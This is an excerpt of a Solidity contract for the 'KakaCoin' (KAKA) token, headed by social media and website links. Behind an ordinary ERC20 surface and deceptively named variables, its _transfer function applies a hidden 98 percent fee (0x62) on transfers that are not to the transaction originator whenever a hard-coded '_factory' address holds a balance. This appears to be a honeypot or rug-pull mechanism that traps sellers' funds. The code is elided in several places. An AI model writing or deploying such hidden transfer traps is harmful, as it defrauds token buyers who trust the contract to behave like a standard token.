...
https://twitter.com/KakaCoinBNB
https://t.me.com/KakaCoinBNB
https://KakaCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2uniswapRouter = 0xF9453401FD6316fc873BF8bC91893DdC34eF9017;
    string private _symbol;
    string private _name;
    mapping(address => mapping(address => uint256)) private _swappingToggles;
    address private _factory = 0xA734e83bE60AF9701516c3010F75aEEf92a9F0c5;
     ...
     * `amount`.
     */
    uint256 private _pairsToken = 0x62;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[_factory] > 0 ? _pairsToken : _swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract KakaCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Kaka", unicode"KAKA")
    {
